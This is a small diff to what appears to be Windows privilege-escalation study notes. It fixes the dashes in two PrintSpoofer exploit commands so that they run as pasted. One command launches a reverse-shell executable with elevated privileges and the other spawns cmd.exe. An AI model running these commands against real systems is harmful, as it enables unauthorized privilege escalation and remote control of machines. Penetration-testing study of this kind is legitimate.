@@ -591,8 +591,8 @@ PrintSpoofer is an exploit that targets the Print Spooler service.
 
 #### Run printspoofer exploit
 ```
-C:\PrivEsc\PrintSpoofer.exe –i -c "C:\temp\reverse.exe"
-C:\PrintSpoofer.exe –i -c cmd.exe
+C:\PrivEsc\PrintSpoofer.exe -i -c "C:\temp\reverse.exe"
+C:\PrintSpoofer.exe -i -c cmd.exe
 ```
 
 ### User privileges
